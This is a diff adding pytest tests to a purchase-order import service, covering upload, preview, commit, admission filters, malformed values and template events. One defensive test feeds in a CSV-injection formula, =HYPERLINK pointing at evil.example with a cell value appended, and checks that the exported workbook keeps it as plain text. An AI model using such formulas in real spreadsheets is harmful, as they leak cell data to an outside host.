@@ -115,7 +115,8 @@ def test_file_only_workspace_upload_preview_commit_export(conn, workspace):
 
 def test_commit_is_refused_twice_and_lifecycle_rules(conn, workspace):
     ws, uid = workspace["id"], workspace["user_id"]
-    up = _upload(conn, ws, uid, [row("PO-DEMO-0101")])
+    data = xlsx([row("PO-DEMO-0101")])          # 同一份字节上传两次（xlsx 里有生成时刻，重新生成会跨秒变化）
+    up = imports.upload(conn, ws, filename="demo-orders.xlsx", data=data, actor_user_id=uid)
     with pytest.raises(DomainError) as e:
         imports.commit(conn, ws, up["batch_id"], uid)                 # 未预览
     assert e.value.code == "VALIDATION"
@@ -130,7 +131,7 @@ def test_commit_is_refused_twice_and_lifecycle_rules(conn, workspace):
         imports.discard(conn, ws, up["batch_id"], uid)
     assert f.count(conn, "purchase_orders") == 1
     # 同一个文件再上传：提醒已导入过；提交后仍只有一笔任务
-    again = _upload(conn, ws, uid, [row("PO-DEMO-0101")])
+    again = imports.upload(conn, ws, filename="demo-orders.xlsx", data=data, actor_user_id=uid)
     assert again["previous_upload"]["id"] == up["batch_id"]
     pv = imports.preview(conn, ws, again["batch_id"])
     assert pv["stats"]["unchanged"] == 1
@@ -279,3 +280,99 @@ def test_batches_are_invisible_across_workspaces(conn, workspace):
     # 同号订单在乙工作区是另一笔任务，互不影响
     up_b = _upload(conn, ws_b, None, [row("PO-DEMO-0601")])
     assert imports.preview(conn, ws_b, up_b["batch_id"])["stats"]["new"] == 1
+
+
+# ── 文件的准入规则、坏数据、模板事件 ─────────────────────────────────────────────
+
+HEADERS_AS = HEADERS + ["售后状态", "采购方", "采购状态"]
+
+
+def _commit_rows(conn, ws, uid, rows, headers=HEADERS_AS, filename="demo-orders.xlsx"):
+    up = imports.upload(conn, ws, filename=filename, data=xlsx(rows, headers=headers), actor_user_id=uid)
+    pv = imports.preview(conn, ws, up["batch_id"])
+    cm = imports.commit(conn, ws, up["batch_id"], uid)
+    return up, pv, cm
+
+
+def test_file_after_sale_cancel_value_cancels_existing_task(conn, workspace):
+    """文件是快照：更新后的文件把「售后状态」改成「已取消」→ 已有任务取消（文件缺省的取消取值）。"""
+    ws, uid = workspace["id"], workspace["user_id"]
+    _commit_rows(conn, ws, uid, [row("PO-DEMO-FC1")])
+    assert _order(conn, ws, "PO-DEMO-FC1")["status"] == "queued"
+    _, pv, _ = _commit_rows(conn, ws, uid, [row("PO-DEMO-FC1", 售后状态="已取消")])
+    assert pv["stats"]["update"] == 1
+    o = _order(conn, ws, "PO-DEMO-FC1")
+    assert o["status"] == "cancelled" and o["upstream_cancelled"] is True
+    # 新单本身就已取消 → 不新建
+    _, pv2, _ = _commit_rows(conn, ws, uid, [row("PO-DEMO-FC2", 售后状态="已取消")])
+    assert pv2["stats"]["invalid"] == 1 and _order(conn, ws, "PO-DEMO-FC2") is None
+
+
+def test_workspace_file_admission_filters_purchaser_and_pauses_existing(conn, workspace):
+    from services import settings_svc
+
+    ws, uid = workspace["id"], workspace["user_id"]
+    _commit_rows(conn, ws, uid, [row("PO-DEMO-FP1", 采购方="自采购DEMO")])
+    settings_svc.update(conn, ws, {"file_admission": {"purchaser_values": ["自采购DEMO"]}}, uid)
+    _, pv, _ = _commit_rows(conn, ws, uid, [row("PO-DEMO-FP1", 采购方="外采购DEMO"),
+                                            row("PO-DEMO-FP2", 采购方="外采购DEMO")])
+    assert pv["stats"]["conflict"] == 1 and pv["stats"]["invalid"] == 1
+    o = _order(conn, ws, "PO-DEMO-FP1")
+    assert o["status"] == "conflict" and o["conflict"]["kind"] == "admission"
+    assert _order(conn, ws, "PO-DEMO-FP2") is None
+    b = conn.execute("SELECT admission FROM procure.import_batches ORDER BY id DESC LIMIT 1").fetchone()
+    assert b["admission"]["purchaser_values"] == ["自采购DEMO"]
+
+
+def test_bought_elsewhere_in_newer_file_pauses_queued_task(conn, workspace):
+    ws, uid = workspace["id"], workspace["user_id"]
+    _commit_rows(conn, ws, uid, [row("PO-DEMO-FB1")])
+    _, pv, _ = _commit_rows(conn, ws, uid, [row("PO-DEMO-FB1", 采购状态="已拍单")])
+    assert pv["stats"]["conflict"] == 1
+    assert _order(conn, ws, "PO-DEMO-FB1")["status"] == "conflict"
+
+
+def test_bad_keys_and_absurd_values_make_rows_invalid_not_500(conn, workspace):
+    """#N/A、多值、科学计数法的平台订单号 → invalid 并写明原因；离谱的天数 / 年份 / 金额只让该行缺资料，不报 500。"""
+    ws, uid = workspace["id"], workspace["user_id"]
+    rows = [row("#N/A"), row("#N/A"), row("1.23457E+12"),
+            row("PO-DEMO-AB1", 配送天数=20261031), row("PO-DEMO-AB2", 下单时间="9999-12-31", 配送天数=4),
+            row("PO-DEMO-AB3", 限价="1e30", 采购单价="12,5"), row("PO-DEMO-AB4", 收货人姓名="#REF!")]
+    up = imports.upload(conn, ws, filename="demo-orders.xlsx", data=xlsx(rows, headers=HEADERS_AS), actor_user_id=uid)
+    pv = imports.preview(conn, ws, up["batch_id"])
+    got = {r["row_no"]: r for r in imports.rows(conn, ws, up["batch_id"], page_size=50)["rows"]}
+    assert got[2]["verdict"] == got[3]["verdict"] == got[4]["verdict"] == "invalid"
+    assert "表格错误值" in got[2]["reason"] and "科学计数法" in got[4]["reason"]
+    assert pv["stats"]["invalid"] == 3
+    for n in (5, 6, 7, 8):
+        assert got[n]["verdict"] == "new" and got[n]["status"] == "needs_info", got[n]
+    assert any("配送天数超出合理范围" in i for i in got[5]["issues"])
+    assert any("年份不合理" in i for i in got[6]["issues"])
+    assert any("限价不是有效金额" in i for i in got[7]["issues"])
+    assert any("表格错误值" in i for i in got[8]["issues"])
+    imports.commit(conn, ws, up["batch_id"], uid)
+    assert _order(conn, ws, "#N/A") is None
+
+
+def test_problems_xlsx_headers_starting_with_equals_stay_text(conn, workspace):
+    import zipfile
+
+    ws, uid = workspace["id"], workspace["user_id"]
+    evil = '=HYPERLINK("http://evil.example/?"&A2,"click")'
+    data = ("平台订单号," + '"' + evil.replace('"', '""') + '"\n,x\n').encode("utf-8")
+    up = imports.upload(conn, ws, filename="demo.csv", data=data, actor_user_id=uid)
+    imports.preview(conn, ws, up["batch_id"])
+    out = imports.problems_xlsx(conn, ws, up["batch_id"])
+    with zipfile.ZipFile(io.BytesIO(out)) as z:
+        assert "<f>" not in z.read("xl/worksheets/sheet1.xml").decode("utf-8")
+
+
+def test_template_save_and_delete_write_events(conn, workspace):
+    ws, uid = workspace["id"], workspace["user_id"]
+    t = imports.save_template(conn, ws, "DEMO 模板", {"平台订单号": "upstream_order_no"}, uid)
+    imports.delete_template(conn, ws, t["id"], uid)
+    evs = conn.execute("SELECT kind, actor_kind, actor_id, detail FROM procure.events WHERE workspace_id = %s "
+                       "AND kind LIKE 'import_template.%%' ORDER BY id", (ws,)).fetchall()
+    assert [e["kind"] for e in evs] == ["import_template.saved", "import_template.deleted"]
+    assert all(e["actor_kind"] == "user" and e["actor_id"] == uid and e["detail"]["template_id"] == t["id"]
+               for e in evs)
